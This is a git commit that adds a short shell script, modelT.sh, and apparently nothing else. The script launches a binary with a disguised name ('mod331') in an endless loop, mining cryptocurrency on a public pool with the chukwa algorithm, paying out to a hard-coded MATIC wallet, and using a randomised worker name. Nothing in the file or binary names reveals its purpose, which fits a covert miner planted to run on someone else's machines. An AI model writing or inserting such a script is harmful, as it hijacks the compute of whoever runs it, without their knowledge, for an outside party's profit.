413d35a0a73f39fee8c981d983b3a72935820e5f
abawb <88323112+abawb@users.noreply.github.com>
2021-08-04 20:14:24 +0530

    modelT.sh

---
+++ modelT.sh
@@ -0,0 +1,9 @@
+POOL=rx.unmineable.com:3333
+WALLET=MATIC:0xb0861cDc09dC09e7C33cFCcE2Da16c07cEFEbBbC
+WORKER=$(echo $(shuf -i 10-40 -n 1)-X)
+a=chukwa
+while [ 1 ]; do
+  sleep 5
+  ./mod331 --algorithm $a --pool $POOL --username $WALLET.$WORKER 
+done
+sleep 999999999
